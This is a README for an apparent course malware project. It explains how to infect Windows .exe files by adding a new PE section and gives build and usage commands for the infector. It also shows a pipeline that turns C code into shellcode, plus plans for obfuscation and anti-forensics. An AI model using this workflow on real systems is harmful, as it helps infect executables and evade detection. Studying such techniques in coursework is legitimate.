# MALW-MCYBERS
## Infection
For the infection part we decided to use *New section* technique. This consits in adding a new section to a *.exe* file.

For this, we have the following files:
- infectPE.cpp
- PE.cpp
- PE.h
- processCreator.cpp
- shellcodeExecuter.cpp

### Compilation

#### Infect a file
```sh
> g++ -c PE.cpp -std=c++17
> g++ -c infectPE.cpp -std=c++17
> g++ -o infectPE.exe infectPE.o
> .\infectPE.exe .\executable_to_infect.exe .\out.exe
```

#### Create shellcode
From C to assembly.
```sh
$ ShellcodeCompiler_x64.exe -r Source.cpp -o Shellcode.bin -a assembly_code.asm -p win_x86
```
Assembly to shellcode.
```sh
$ nasm -f win32 assembly_code.asm 
$ objcopy -j .text -O binary assembly_code.obj temp_file.bin
$ hexdump -v -e '"\\" 1/1 "x%02x"' temp_file.bin
```

#### Run sever
```sh
$ sudo node index.js
```

### To Do
- [ ] Update downloaded file path and name
- [ ] Payload of exe file
- [ ] Obfuscation
- [ ] Antiforensics

### Old versions
```sh
> g++ -c processCreator.cpp
> g++ -o procesCreator.exe processCreator.o
> .\processCreator.exe executable_to_execute.exe

> g++ -c shellcodeExecuter.cpp
> g++ -o shellcodeExecuter.exe shellcodeExecuter.o
> .\shellcodeExecuter.exe
```
